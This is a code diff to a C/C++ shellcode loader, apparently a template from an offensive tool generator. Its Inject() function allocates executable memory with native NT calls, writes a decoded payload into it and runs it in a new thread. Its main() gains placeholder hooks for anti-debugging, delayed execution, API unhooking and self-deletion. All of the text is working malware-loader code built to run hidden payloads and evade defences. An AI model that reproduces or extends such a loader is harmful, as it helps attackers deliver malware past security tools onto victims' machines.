@@ -28,27 +28,30 @@ int Inject()
 	LPVOID allocation_start = nullptr;
 
     NTSTATUS status;
-	HANDLE targetHandle = (HANDLE)-1;
+	HANDLE targetHandle = (HANDLE)((int)-1);
 	if (targetHandle == 0){
-	    printf("[-] Invalid Target Handle");
+	    printf("[-] Invalid Target Handle\n");
 	    exit(1);
 	}
+    printf("[*] Allocating virtual memory\n");
 	status = NtAllocateVirtualMemory(targetHandle, &allocation_start, 0, (PSIZE_T)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (status < 0){
-	    printf("[-] Memory allocation failed");
+	    printf("[-] Memory allocation failed\n");
 	    exit(1);
 	}
 
+    printf("[*] Writing virtual memory\n");
 	status = NtWriteVirtualMemory(targetHandle, allocation_start, decoded, length, 0);
     if (status < 0){
-	    printf("[-] Memory writing failed");
+	    printf("[-] Memory writing failed\n");
 	    exit(1);
 	}
 
 	HANDLE targetThreadHandle = NULL;
+    printf("[*] Creating thread\n");
 	NtCreateThreadEx(&targetThreadHandle, GENERIC_EXECUTE, NULL, targetHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
     if (targetThreadHandle == NULL){
-	    printf("[-] Invalid Thread Handle");
+	    printf("[-] Invalid Thread Handle\n");
 	    exit(1);
 	}
 
@@ -58,12 +61,10 @@ int Inject()
 int main(int argc, char** argv) {
 
     //####DELAY####
-
-	//####ANTIDEBUG####
-
+    //####ANTIDEBUG####
+    //####ARGS####
+    //####SELF_DELETE####
 	//####UNHOOK####
-
-	//####ARGS####
 
 	Inject();
 
